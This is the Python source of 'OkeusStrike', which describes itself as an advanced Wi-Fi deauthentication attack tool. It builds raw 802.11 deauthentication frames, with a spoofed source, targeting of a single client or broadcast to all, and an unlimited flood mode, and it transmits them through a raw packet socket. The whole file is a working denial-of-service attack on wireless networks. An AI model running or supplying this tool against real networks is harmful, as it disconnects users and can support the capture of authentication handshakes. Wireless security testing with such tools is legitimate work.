#!/usr/bin/env python3

# OkeusStrike - Advanced Deauthentication Attack Tool - okeus
# Copyright (C) 2025 Richard Smith (Islc12)
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <https://www.gnu.org/licenses/>.

# not all these imports are used in the final code, they are here until I determine exactly which file they will be used in
import socket  # Low-level networking with raw sockets
import okeusarguments # Parsing command-line arguments from arguments.py
import convert # MAC address conversion from convert.py
import reason # Handles reason codes
import rt # Adds radio tap header 
import os # Used for ensuring permissions are set
import struct  # Unpacking binary data (e.g., network headers)
import sys 
import random
import time

def f_assem(args):
    # Parse command-line arguments
    interface = args.netinterface # handled automatically
    dest_mac = args.dest # mapped
    source_mac = args.ap_source # mapped
    network_bssid = args.net_bssid # mapped
    broadcast_attack =  args.broadcast # mapped
    frag = args.fragment # mapped
    seq_num = args.sequence # mapped
    reason_code = args.reason_code # mapped
    timedelay = args.time # mapped
    frame_flood = args.flood # mapped
    num_frames = args.count # mapped
    dur_of_attack = args.duration # mapped

    if any(arg in sys.argv for arg in ("-h", "--help")):
        parser = argparse.ArgumentParser()
        parser.print_help()
        sys.exit(0)
    if os.geteuid() != 0:
        print("ATTENTION: Script requires root privlages, please run as root")
        exit(1)
    # handle all illogical arguments
    if (broadcast_attack or timedelay or frame_flood or num_frames or
    frag or seq_num or reason or dur_of_attack) and not (dest_mac or broadcast_attack):
        print("Error: target input required") # requires target input for most operations
        exit(1)
    if (broadcast_attack or timedelay or frame_flood or num_frames or
    frag or seq_num or reason or dur_of_attack) and not network_bssid:
        print("Error: network BSSID required") # requires network BSSID for most operations
        exit(1)
    if frame_flood and (num_frames or timedelay or dur_of_attack):
        print("Error: --flood requires no other arguments")
        exit(1)
    if broadcast_attack and dest_mac:
        print("Invalid arguments, too many addresses in Address 1")
        exit(1)
    if not (broadcast_attack or dest_mac):
        print("Invalid input, need address 1 field")
        exit(1)
    
    # starts the 80211 mac header, deauth frame byte
    f_ctl = struct.pack('B', 0xC0)

    # second byte makeup of FCF
    if not frag:
        ch = "NO"
        f_frag = struct.pack('B', 0x00)
    elif frag:
        ch = "YES"
        f_frag = struct.pack('B', 0x10)

    # Duration field
    f_dur = struct.pack('<H', 0x00)

    # Address 1 field
    if broadcast_attack:
        ct = struct.pack('!6B', 0xFF, 0XFF, 0XFF, 0XFF, 0XFF, 0XFF)
    elif dest_mac:
        ct = convert.machex(dest_mac)

    # Address 2 field, if not given Address 3 fills
    if not source_mac:
        src = convert.machex(network_bssid)
    elif source_mac:
        src = convert.machex(source_mac)

    # Address 3 field
    if network_bssid:
        net = convert.machex(network_bssid)
    if not network_bssid:
        print("Invalid argument, missing Address 3")
        exit(1)

    return f_ctl, f_frag, f_dur, ct, src, net, ch

def main():
    args = okeusarguments.parse_arguments()

    timedelay = args.time # mapped
    frame_flood = args.flood # mapped
    num_frames = args.count # mapped
    dur_of_attack = args.duration # mapped
    interface = args.netinterface
    verbose = args.verbose
    dest_mac = args.dest # mapped
    source_mac = args.ap_source # mapped
    network_bssid = args.net_bssid # mapped
    broadcast_attack =  args.broadcast # mapped
    frag = args.fragment # mapped
    seq_num = args.sequence # mapped
    reason_code = args.reason_code # mapped

    f_ctl, f_frag, f_dur, ct, src, net, ch = f_assem(args)
    radio, ver, pad, rt_len, fp = rt.rt_head()
    df = radio + f_ctl + f_frag + f_dur + ct + src + net

    def reas():
        # Body
        if not reason_code:
            rc = reason.reasoncode_input(0)
        elif reason_code:
            rc = reason.reasoncode_input(reason_code)

        return rc

    def ver():
        print(f"{'Frame composition'.center(100)}")
        print("-" * 100)
        print(f"Radiotap version: {ver}")
        print(f"Radiotap pad: {pad.hex()}")
        print(f"Radiotap length: {rt_len.hex()}")
        print(f"Radiotap fields present: {fp.hex()}")
        print(f"Frame type: {f_ctl.hex().upper()}")
        print(f"Fragmentation set: {ch}")
        print("Duration: 0x00, 0x00")
        if broadcast_attack:
            print("Destination: FF:FF:FF:FF:FF:FF")
        elif dest_mac:
            print(f"Destination: {dest_mac.upper()}")
        if not source_mac:
            print(f"Source: {network_bssid.upper()}")
        elif source_mac:
            print(f"Source: {source_mac.upper()}")
        print(f"Network: {network_bssid.upper()}")
        print(f"Fragmentation: {frag}")
        print(f"Sequence Control: {seq_num}")
        if not reason_code:
            print(f"Reason Code: {reason.def_code(0)}")
        if reason_code:
            print(f"Reason Code: {reason.def_code(reason_code)}")
        print("-" * 100)

    def fs():
        # Sequence Control Field
        if not hasattr(fs, "sn"):
            fs.sn = 1
        if not (frag or seq_num):
            seq = struct.pack('<H', 0x00)
        elif frag and not seq_num:
            rf = random.randint(1, 14)
            seq = struct.pack('<H', rf & 0x0F)
        elif seq_num and not frag:
            seq = struct.pack('<H', (fs.sn << 4) & 0xFFF0)
            fs.sn += 1
        elif (seq_num and frag):
            rf = random.randint(1, 14)
            if rf >= 8:
                seq = struct.pack('<H', ((fs.sn << 4) & 0xFFF0) | (rf & 0x0F))
                fs.sn += 1
            else:
                seq = struct.pack('<H', (fs.sn << 4) & 0xFFF0)

        return seq

    # Open the socket
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
    s.bind((interface, 0))

    r = reas()

    if frame_flood:
        nmframe = 1
        if verbose:
            ver()
        try:
            tg = ct.hex().upper()
            tgt = ''.join([f'\\x{tg[i:i+2]}' for i in range(0, len(tg), 2)])
            print(f"Flooding: {tgt}\nInterrupt with CTRL + C")
            while True:
                sq = fs()
                frame = df + sq + r
                s.send(frame)
                time.sleep(.15)
                nmframe += 1
        except KeyboardInterrupt:
            print("\nEnding flood attack")
        except Exception as e:
            print(f"Error: {e}")
        finally:
            print(f"Sent {nmframe} frames to {tgt}")
            s.close()

    if not frame_flood:
        if timedelay:
            t = timedelay / 1000
            ti = timedelay
        if not timedelay:
            ti = 500
            t = ti / 1000
        if num_frames:
            n = num_frames
        if not num_frames:
            n = 1
        try:
            if verbose:
                ver()
            print(f"Sending {n} frames at a rate of {ti} ms.")
            for i in range(n):
                sq = fs()
                frame = df + sq + r
                s.send(frame)
                if verbose:
                    print(f"Sending frame: {i + 1}/{n}")
                    frme = frame.hex().upper()
                    frmes = ''.join([f'\\x{frme[i:i+2]}' for i in range(0, len(frme), 2)])
                    print(frmes)
                    if ti < 1000:
                        print(f"Waiting {ti} ms...")
                    elif ti >= 1000:
                        print(f"Waiting {ti / 1000} second(s)...")
                    print(t)
                time.sleep(t)
        except KeyboardInterrupt:
            print("\n")
            exit(1)
        except Exception as e:
            print(f"Error: {e}")
        finally:
            print("Completed!!!")
            s.close()

if __name__ == "__main__":
    main()